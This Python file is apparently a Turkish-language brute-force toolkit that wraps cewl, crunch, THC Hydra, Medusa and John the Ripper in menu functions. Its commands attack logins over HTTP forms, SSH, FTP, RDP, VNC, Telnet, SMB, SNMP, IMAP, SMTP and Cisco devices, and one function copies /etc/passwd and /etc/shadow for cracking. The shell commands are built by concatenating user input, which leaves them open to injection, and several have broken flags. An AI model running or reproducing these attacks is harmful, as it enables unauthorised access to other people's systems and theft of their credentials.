#!/usr/bin/env python
# -*- coding: utf-8 -*-
import time as bekle
import os
import string
import colorama
from colorama import Fore, Back, Style
import webbrowser
def banner():
	print("""\033[1;37m
██████╗ ██╗  ██╗████████╗              ███████╗███████╗██████╗ ██╗   ██╗██╗███████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║  ██║╚══██╔══╝              ██╔════╝██╔════╝██╔══██╗██║   ██║██║██╔════╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝███████║   ██║       █████╗    ███████╗█████╗  ██████╔╝██║   ██║██║███████╗    ██████╔╝██████╔╝██║   ██║   ██║   █████╗
██╔══██╗██╔══██║   ██║       ╚════╝    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║╚════██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
██║  ██║██║  ██║   ██║                 ███████║███████╗██║  ██║ ╚████╔╝ ██║███████║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
\033[1;31m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                 ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
redhackaze.org  | MyPoison, ynroot                                                                                                    """)


#########Cewl Aracı###########
#Normal Proxysiz Taraması
def normalword(derinlik,uzunluk,link,kayit):
    os.system("clear")
    banner()
    if len(kayit) < 1:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -d "+derinlik+" -m "+uzunluk+" "+link+" -w "+" cewl/kayit.lst")
        print("Dosya Kaydedildi. Konum : cewl/"+kayit)
    else:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -d "+derinlik+" -m "+uzunluk+" "+link+" -w "+" cewl/"+kayit+".lst")
        print("Dosya Kaydedildi. Konum : cewl/"+kayit)

#proxyli normal sürüm

def normalworldproxy(derinlik,uzunluk,link,kayit,proxy,proxyport,secim):
    os.system("clear")
    banner()

    if secim == "y":
        username = input("Kullanıcı adını giriniz | rht > ")
        password = input("Şifresini Giriniz | rht > ")
        if len(kayit) < 1:
            os.system("cewl -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+ " –proxy_username "+username+" –proxy_password  "+password+" --with_numbers "+" -w cewl/kayit.lst")
            bekle.sleep(3)
            print('Dosya Kaydedildi konum: cewl/'+kayit)
            print("İşlem Tamamlandı")
    else:
        if len(kayit) > 1:
            os.system("cewl -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" --with_numbers "+" -w cewl/"+kayit)
            bekle.sleep(3)
            print('Dosya Kaydedildi konum: cewl/'+kayit)
            print("İşlem Tamalandı")
#Emaiileri bulur
def emailworld(derinlik,uzunluk,link,kayit):
    os.system("clear")
    banner()
    if len(kayit) < 1:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -w "+"cewl/kayit.lst")
        bekle.sleep("3")
        print("İşlem Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/kayit.lst')
    else:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -w "+"cewl/"+kayit+".lst")
        bekle.sleep("3")
        print("İşlem Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/'+kayit+'.lst')
def emailworldproxy(derinlik,uzunluk,link,kayit,proxy,proxyport,secim):
    os.system("clear")
    banner()

    if secim == "y":
        username = input("Kullanıcı adını giriniz | rht > ")
        password = input("Şifresini Giriniz | rht > ")
        if len(kayit) <1:
            os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+ " –proxy_username "+username+" –proxy_password  "+password+" --with_numbers "+" -w cewl/kayit.lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/'+kayit)
        else:
            os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+ " –proxy_username "+username+" –proxy_password  "+password+" --with_numbers "+" -w cewl/"+kayit+".lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/'+kayit)


    else:
        if len(kayit) < 1:

            os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" --with_numbers "+" -w cewl/kayit.lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/kayit.lst')
        else:
            os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" --with_numbers "+" -w cewl/"+kayit+".lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/'+kayit)
#Meta veri toplar
def metadump(derinlik,uzunluk,link,kayit):
    
    os.system("clear")
    banner()
    if len(kayit) < 1:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -meta "+" -w "+"cewl/kayit.lst")
        bekle.sleep(3)
        print("İşlem Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/kayit.lst')
    else:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl -email -d "+derinlik+" -m "+uzunluk+" "+link+" -meta "+" -w "+"cewl/"+kayit+".lst")
        bekle.sleep(3)
        print("İşlem Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/'+kayit+".lst")

#Meta verisi toplar proxyli
def metadumpproxy(derinlik,uzunluk,link,kayit,proxy,proxyport,secim):
    os.system("clear")
    banner()
    if secim == "y":
        username = input("Kullanıcı adını giriniz | rht > ")
        password = input("Şifresini Giriniz | rht > ")
        if len(kayit) < 1:
            os.system("cewl -meta -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" -proxy_username "+username+" -proxy_password "+password+" -w cewl/kayit.lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/kayit.lst')
        else:
            os.system("cewl -meta -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" -proxy_username "+username+" -proxy_password "+password+" -w cewl/"+kayit+".lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/'+kayit)

    else:
        if len(kayit) < 1:
            os.system("cewl -meta -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -prox_port "+proxyport+" -w cewl/kayit.lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/kayit.lst')
        else:
            os.system("cewl -meta -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" -proxy_username "+username+" -proxy_password "+password+" -w cewl/"+kayit+".lst")
            bekle.sleep(3)
            print("İşlem Tamamlandı")
            print('Dosya Kaydedildi konum: cewl/'+kayit)
#Login panelinden  world list yapma
def authdump(derinlik,uzunluk,link,kayit):
    os.system("clear")
    banner()
    if len(kayit) < 1:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl "+link+" "+" --auth_type Digest --auth_user admin --auth_pass password -w cewl/kayit.lst")
        bekle.sleep(3)
        print("İşlemler Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/kayit.lst')
    else:
        print("Başlatılıyor")
        bekle.sleep(3)
        os.system("cewl "+link+" "+" --auth_type Digest --auth_user admin --auth_pass password -w cewl/"+kayit)
        bekle.sleep(3)
        print("İşlemler Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/'+kayit)

#Login panelinden world list yapma proxy
def authdupproxy(derinlik,uzunluk,link,kayit,proxy,proxyport,secim):
    os.system("clear")
    banner()
    if secim == "y":
        username = input("Kullanıcı adını giriniz | rht > ")
        password = input("Şifresini Giriniz | rht > ")
        os.system("cewl --auth_type Digest --auth_user admin --auth_pass password -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -proxy_port "+proxyport+" -proxy_username "+username+" -proxy_password "+password)
        bekle.sleep(3)
        print("İşlemler Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/'+kayit)

    else:
        os.system("cewl --auth_type Digest --auth_user admin --auth_pass password -d "+derinlik+" -m "+uzunluk+" "+link+" -proxy_host "+proxy+" -prox_port "+proxyport)
        bekle.sleep(3)
        print("İşlemler Tamamlandı")
        print('Dosya Kaydedildi konum: cewl/'+kayit)



#######Crunch Toolu#########
def crunch(minimum,maksimum,hangikarakterler,kayit):
    os.system("clear")
    banner()
    if len(kayit) < 1:
        print("İşlemler Tamamlandı")
        bekle.sleep(3)
        os.system("crunch "+minimum+" "+maksimum+" "+hangikarakterler+" -o crunch/kayit.lst")
        bekle.sleep(3)
        print("Dosya Kaydedildi konum: crunch/kayit.lst")
    else:
        print("İşlemler Tamamlandı")
        bekle.sleep(3)
        os.system("crunch "+minimum+" "+maksimum+" "+hangikarakterler+" -o crunch/"+kayit+".lst")
        bekle.sleep(3)
        print("Dosya Kaydedildi konum: crunch/"+kayit+".lst")








######### THC Hydra Toolu########

#Login Paneli Brute Force

def panelbrute(user,passlists,target,userform,passform,failmessage,useradet,passadet,paneldizini):
    if useradet == 1:
        if passadet == 1:
            os.system("clear")
            banner()
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra "+target+" -l "+user+" -p "+passlists+" http-post-form"+" \""+paneldizini+":"+userform+"=^USER^&"+passform+"=^PASS^&Login=Login:"+failmessage+"\""+" -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        elif passadet > 1:
            os.system("clear")
            banner()
            print("İşlem Başlatılıyor")
            bekle.sleep(3)

            os.system("hydra "+target+" -l "+user+" -P "+passlists+" http-post-form"+"\""+paneldizini+":"+userform+"=^USER^&"+passform+"=^PASS^&Login=Login:"+failmessage+"\""+" -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        else:
            print("hata oluştu")
    elif useradet > 1:
        if passadet == 1:
            os.system("clear")
            banner()
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra "+target+" -L "+user+" -p "+passlists+" http-post-form"+"\""+paneldizini+":"+userform+"=^USER^&"+passform+"=^PASS^&Login=Login:"+failmessage+"\""+" -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        elif passadet > 1:
            os.system("clear")
            banner()
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra "+target+" -L "+user+" -P "+passlists+" http-post-form"+"\""+paneldizini+":"+userform+"=^USER^&"+passform+"=^PASS^&Login=Login:"+failmessage+"\""+" -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        else:
            print("Hata Oluştu")
    else:
        print("hata oluştu")

#SSH Servisine Brute Force
def sshbrute(user,worldlist,ip,useradet,passadet):
    os.system("clear")
    banner()
    if useradet == 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -p "+worldlist+" -h "+ip+" ssh -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+ip)
        elif passadet > 1:
            print("İşlemler Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -P "+worldlist+" -h "+ip+" ssh -v")
        else:
            print("hata oluştu")
    elif useradet > 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -p "+worldlist+" -h "+ip+" ssh -v")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+ip)
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -P "+worldlist+" -h "+ip+" ssh -v")
            print("İşlem Bitirildi hedef : "+ip)        
        else:
            print("hata oluştu")

#FTP Servisine Brute

def ftpbrute(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()
    if useradet == 1:
        if passadet == 1:
            print("İşlemler Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -l "+user+" -p "+worldlist+" -vV "+target+" ftp")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        elif passadet > 1:
            print("İşlemler Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -l "+user+" -P "+worldlist+" -vV "+target+" ftp")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        else:
            print("hata")
    elif useradet > 1:
        if passadet == 1:
            print("İşlemler Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+user+" -p "+worldlist+" -vV "+target+" ftp")
            bekle.sleep(3)
            print("İşlem Bitirildi hedef : "+target)
        elif passadet > 1:
            print("İşlemler Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+user+" -P "+worldlist+" -vV "+target+" ftp")
        else:
            print("hata")
    else:
        print("hata")


#RDP ATAK
def rdpatak(worldlist,port,target,passadet):
    os.system("clear")
    banner()

    if passadet == 1:
        os.system("clear")
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -p "+worldlist+" -t 1 -w 5 -f -s "+port+" "+target+" rdp "+" -v")
        bekle.sleep(3)
        print("İşlem Bitirildi hedef : "+target)

    elif passadet > 1:
        os.system("clear")
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -P "+worldlist+" -t 1 -w 5 -f -s "+port+" "+target+" rdp "+" -v")
        bekle.sleep(3)
        print("İşlem Bitirildi hedef : "+target)

#vnc atak
def vncatak(worldlist,port,target,passadet):
    os.system("clear")
    banner()

    if passadet == 1:
        os.system("clear")
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -p "+worldlist+" -t 1 -w 5 -f -s "+port+" "+target+" vnc "+" -v")
        bekle.sleep(3)
        print("İşlem Bitirildi hedef : "+target)

    elif passadet > 1:
        os.system("clear")
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -P "+worldlist+" -t 1 -w 5 -f -s "+port+" "+target+" vnc "+" -v")
        bekle.sleep(3)
        print("İşlem Bitirildi hedef : "+target)

#Telnet Atak
def telnetatak(username,worldlist,port,target,passadet,useradet):
    os.system("clear")
    banner()

    if useradet == 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -l "+username+" -p "+worldlist+" -vV "+target+" telnet")
            bekle.sleep(3)
            print("İşlem Bitirildi")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+username+" -P "+worldlist+" -vV "+target+" telnet")
            bekle.sleep(3)
            print("İşlem Bitirildi")
        else:
            print("hata")
    elif useradet > 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t -L "+username+" -p "+worldlist+" -vV "+target+" telnet")
            bekle.sleep(3)
            print("İşlem Bitirildi")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+username+" -P "+worldlist+" -vV "+target+" telnet")
            bekle.sleep(3)
            print("İşlem Bitirildi")
        else:
            print("Bitirildi")
    else:
        print("hata")

#HTTP Basic Auth Korumalı Sitelere Yönelik Brute Force

def basicauth(user,worldlist,target,useradet,passadet):
	os.system("clear")
	banner()

	if useradet == 1:
		if passadet == 1:
			print("İşlem Başlatılıyor")
			bekle.sleep(3)
			os.system("hydra -l "+user+" -p "+worldlist+" "+target)
			bekle.sleep(3)
			print("İşlem Tamamlandı")
		elif passadet > 1:
			print("İşlem Başlatılıyor")
			bekle.sleep(3)
			os.system("hydra -l "+user+" -P "+worldlist+" "+target)
			bekle.sleep(3)
			print("İşlem Tamamlandı")
		else:
			print("Hata")
	elif useradet > 1:
		if passadet == 1:
			print("İşlem Başlatılıyor")
			bekle.sleep(3)
			os.system("hydra -L "+user+" -p "+worldlist+" "+target)
			bekle.sleep(3)
			print("İşlem Tamamlandı")
		elif passadet > 1:
			print("İşlem Başlatılıyor")
			bekle.sleep(3)
			os.system("hydra -L "+user+" -P "+worldlist+" "+target)
			bekle.sleep(3)
			print("İşlem Tamamlandı")
		else:
			print("hata")
	else:
		print("Hata")

#Firewall Brute Force,Usernamesiz(cisco AAA)

def firewallbrute(worldlist,target,passadet,port):
    os.system("clear")
    banner()

    if passadet == 1:
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -p "+worldlist+" "+target+" cisco-enable -s "+port)
        bekle.sleep(3)
        print("İşlem Bitti")
    elif passadet > 1:
        print("İşlem Başlatılıyor")
        bekle.sleep(3)
        os.system("hydra -P "+worldlist+" "+target+" cisco-enable -s "+port)
        bekle.sleep(3)
        print("İşlem Bitti")
    else:
        print("Hata")
    
# Firewall Brute Force , Usernameli(cisco AAA)

def firewallbrutepass(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()
    if useradet == 1:
        if passadet == 1:
            os.system("clear")
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -p "+worldlist+" "+target+" -vV cisco-enable")

        elif passadet > 1:
            os.system("clear")
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -P "+worldlist+" "+target+" -vV cisco-enable")
        else:
            print("Hata")
    elif useradet > 1:
        if passadet == 1:
            os.system("clear")
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -U "+user+" -p "+worldlist+" "+target+" -vV cisco-enable")
        elif passadet > 1:
            os.system("clear")
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -U "+user+" -P "+worldlist+" "+target+" -vV cisco-enable")
        else:
            print("Hata")    



#SMB ATAk

def smbatak(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()

    if useradet == 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -l "+user+" -p "+worldlist+" -vV "+target+" smb")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -l "+user+" -P "+worldlist+" -vV "+target+" smb")
        else:
            print("hata")

    elif useradet > 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+user+" -p "+worldlist+" -vV "+target+" smb")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -t 1 -L "+user+" -P "+worldlist+" -vV "+target+" smb")
        else:
            print("hata")
    else:
        print("hata")

#SNMP ATAK

def snmpbrute(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()

    if useradet == 1:
        if passadet == 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -p "+worldlist +"-m 2 "+target+" snmp")
        elif passadet > 1:
            os.system("hydra -l "+user+" -P "+worldlist +"-m 2 "+target+" snmp")
        else:
            print("hata")
    elif useradet > 1:
        if passadet == 1:
            os.system("hydra -L "+user+" -p "+worldlist +"-m 2 "+target+" snmp")
        elif passadet > 1:
            os.system("hydra -L "+user+" -P "+worldlist +"-m 2 "+target+" snmp")
        else:
            print("Hata")
    else:
        print("Hata")

#SNMP ATAK(ENCODING EDITION)

def snmpencode(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()

    if useradet == 1:
        if passadet == 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -p "+worldlist+" -m 3:SHA:AES:READ "+target+" snmp")
        elif passadet > 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -P "+worldlist+" -m 3:SHA:AES:READ "+target+" snmp")
        else:
            print("hata")
    elif useradet > 1:
        if passadet == 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -p "+worldlist+" -m 3:SHA:AES:READ "+target+" snmp")
        elif passadet > 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -P "+worldlist+" -m 3:SHA:AES:READ "+target+" snmp")
        else:
            print("hata")
    else:
        print("hata")

#IMAP ATAK

def imapbrute(user,worldlist,target,useradet,passadet):
    os.system("clear")
    banner()

    if useradet == 1:
        if passadet == 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -p "+worldlist+" imap://"+target+"/PLAIN")
        elif passadet > 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -l "+user+" -P "+worldlist+" imap://"+target+"/PLAIN")
        else:
            print("hata")
    elif useradet > 1:
        if passadet == 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -p "+worldlist+" imap://"+target+"/PLAIN")
        elif passadet > 1:
            print("Başlatılıyor")
            bekle.sleep(3)
            os.system("hydra -L "+user+" -P "+worldlist+" imap://"+target+"/PLAIN")
        else:
            print("hata")
    else:
        print("hata")

######John The Ripper#######
#Linux Kullanııc Şifre Kırma

#Passwd ve Shadow Çekiyor
def dumppassshadow():
    os.system("clear")
    banner()
    a = input("""
\033[1;33mNereye Çekmek İstersiniz

\033[1;31mrht>\033[1;37m """)
    
    try:
        print("Passwd Çekilmeye Çalışılıyor")
        os.system("cp /etc/passwd "+a)
        os.system("clear")
        print("Shadow Çek")
        os.system("cp /etc/shadow "+a)
        
        print("İşlem Bitti")
        bekle.sleep(3)
        os.system("clear")
    except:
        print("Bilinmeyen Bir Hata Oluştu")




def birlestirvekir(passwd,shadow,dosyaadi):
    os.system("clear")
    banner()

    
    os.system("unshadow "+passwd+" "+shadow+" > "+dosyaadi+".txt")
    os.system("john --wordlist=/usr/share/john/password.lst "+dosyaadi+".txt")
    os.system("john -show ")
    print("İşlem Bitti")
    bekle.sleep(3)



#MD5 KIRICI
def md5pass(dosyayolu):
    os.system("clear")
    banner()
    os.system("john --format=raw-md5 "+dosyayolu+" --show")
    print("Bitti")
    bekle.sleep(3)

#HASH Tipini Tespit Edip Ona göre kırma işlemi yapar
def unkwonpass(dosyayolu):
    os.system("clear")
    banner()

    os.system("john "+dosyayolu)
    bekle.sleep(3)
    print("İşlem Bitti")



def secimpass(dosyayolu):
    os.system("clear")
    banner()
    os.system("john --list=formats")
    bekle.sleep(3)
    secim = input("""
\033[1;33mHangisini İstersiniz

\033[1;31mrht>\033[1;37m """)
    os.system("john --format=raw-"+secim+" "+dosyayolu+" --show")

####### Medusa Aracı #######


#FTP Brute

def ftpbrutemedusa(user,wordlist,useradet,passadet,a):
    os.system("clear")
    banner()
    

        
    if useradet == 1:
        
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -p "+wordlist+" -M FTP")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -P "+wordlist+" -M FTP")
        else:
            print("Hata")
    elif useradet > 1:
        
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -p "+wordlist+" -M FTP")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -P "+wordlist+" -M FTP")
        else:
            print("Hata")
       
   
#SSH BRUTE

def medusashhbrute(user,wordlist,useradet,passadet,a):
    os.system("clear")
    banner()
    
    
    
    if useradet == 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -p "+wordlist+" -M SSH")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -P "+wordlist+" -M SSH")
        else:
            print("Hata")
    elif useradet > 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -p "+wordlist+" -M SSH")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -P "+wordlist+" -M SSH")
        else:
            print("Hata")
    else:
        print("Hata")
   
        
#SMTP BRUTE
def medusasmtpbrute(user,wordlist,useradet,passadet,a):
    os.system("clear")
    banner()
    
    
    
    if useradet == 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -p "+wordlist+" -M SMTP")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -u "+user+" -P "+wordlist+" -M SMTP")
        else:
            print("Hata")
    elif useradet > 1:
        if passadet == 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -p "+wordlist+" -M SMTP")
        elif passadet > 1:
            print("İşlem Başlatılıyor")
            bekle.sleep(3)
            os.system("medusa -H "+a+" -U "+user+" -P "+wordlist+" -M SMTP")
        else:
            print("Hata")
    else:
        print("Hata")
    
        
       
               
#redhackeze.org web sitesini açar

def redhackaze():
    webbrowser.open("https://redhackaze.org")
        
        
        
        
